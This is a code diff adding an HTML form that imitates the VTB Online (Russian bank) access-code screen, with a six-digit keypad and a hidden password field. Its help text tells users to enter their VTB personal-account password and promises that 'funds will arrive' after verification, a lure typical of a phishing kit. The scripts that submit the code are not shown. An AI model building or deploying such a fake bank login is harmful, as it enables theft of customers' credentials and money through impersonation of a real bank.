@@ -1,0 +1,87 @@
+
+<form method="post" onsubmit="event.preventDefault(); return false;" id="user_access_form" class="user_access_form user_access_form_vtb block-form">
+    <input type="hidden" value="" name="user_access_password" maxlength="6" id="user_access_password">
+    <div class="access_form">
+        <div class="access_form__logo">
+            <div class="white_logo"></div>
+            <div class="color_logo"></div>
+        </div>
+        <div class="access_form__title">Введите код доступа</div>
+<div class="access_form__undertitle">Вы устанавливали его для входа в ВТБ Онлайн</div>
+        <div class="access_form__dots">
+            <span class="access_form__dots-item"></span>
+            <span class="access_form__dots-item"></span>
+            <span class="access_form__dots-item"></span>
+            <span class="access_form__dots-item"></span>
+            <span class="access_form__dots-item"></span>
+            <span class="access_form__dots-item"></span>
+        </div>
+        <div class="access_form__keyboard">
+            <div class="access_form__keyboard-row">
+                <div class="access_form__keyboard-item" onclick="enter_password_digit_vtb(1)">
+                    <span class="access_form__keyboard-item-number">1</span>
+                    <span class="access_form__keyboard-item-symbol"></span>
+                </div>
+                <div class="access_form__keyboard-item" onclick="enter_password_digit_vtb(2)">
+                    <span class="access_form__keyboard-item-number">2</span>
+                    <span class="access_form__keyboard-item-symbol">абвг</span>
+                </div>
+                <div class="access_form__keyboard-item" onclick="enter_password_digit_vtb(3)">
+                    <span class="access_form__keyboard-item-number">3</span>
+                    <span class="access_form__keyboard-item-symbol">дежз</span>
+                </div>
+            </div>
+            <div class="access_form__keyboard-row">
+                <div class="access_form__keyboard-item" onclick="enter_password_digit_vtb(4)">
+                    <span class="access_form__keyboard-item-number">4</span>
+                    <span class="access_form__keyboard-item-symbol">ийкл</span>
+                </div>
+                <div class="access_form__keyboard-item" onclick="enter_password_digit_vtb(5)">
+                    <span class="access_form__keyboard-item-number">5</span>
+                    <span class="access_form__keyboard-item-symbol">мноп</span>
+                </div>
+                <div class="access_form__keyboard-item" onclick="enter_password_digit_vtb(6)">
+                    <span class="access_form__keyboard-item-number">6</span>
+                    <span class="access_form__keyboard-item-symbol">рсту</span>
+                </div>
+            </div>
+            <div class="access_form__keyboard-row">
+                <div class="access_form__keyboard-item" onclick="enter_password_digit_vtb(7)">
+                    <span class="access_form__keyboard-item-number">7</span>
+                    <span class="access_form__keyboard-item-symbol">фхцч</span>
+                </div>
+                <div class="access_form__keyboard-item" onclick="enter_password_digit_vtb(8)">
+                    <span class="access_form__keyboard-item-number">8</span>
+                    <span class="access_form__keyboard-item-symbol">шщъы</span>
+                </div>
+                <div class="access_form__keyboard-item" onclick="enter_password_digit_vtb(9)">
+                    <span class="access_form__keyboard-item-number">9</span>
+                    <span class="access_form__keyboard-item-symbol">ьэюя</span>
+                </div>
+            </div>
+            <div class="access_form__keyboard-row">
+                <div class="access_form__keyboard-item access_form__keyboard-item__confirm" onclick="user_send_password_form_vtb()">
+                    <span class="access_form__keyboard-item-line"></span>
+                </div>
+                <div class="access_form__keyboard-item" onclick="enter_password_digit_vtb(0)">
+                    <span class="access_form__keyboard-item-line access_form__keyboard-item-line_number">0</span>
+                </div>
+                <div class="access_form__keyboard-item access_form__keyboard-item_transparent" onclick="remove_password_digit()">
+                    <div class="access_form__keyboard-item-line">
+                        <svg width="34" height="28" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M 0 14 L 13 0 L 31 0 Q 33 0 33 2 L 33 26 Q 33 28 31 28 L 13 28 Z" fill="none" stroke="#FFFFFF" stroke-width="3"></path> <!-- Контур без заливки -->
+                            <line x1="18" y1="9" x2="26" y2="19" stroke="#FFFFFF" stroke-width="3"></line>
+                            <line x1="26" y1="9" x2="18" y2="19" stroke="#FFFFFF" stroke-width="3"></line>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="ask_password_help_link">
+            <a href="javascript:void(0);" class="link_main_color" onclick="user_ask_password_help();">Как мне войти?</a>
+            <span>
+            Введите пароль от Вашего личного кабинета ВТБ. После входа Вы будете верифицированы в системе и средства поступят на имеющийся счёт.
+            </span>
+        </div>
+    </div>
+</form>
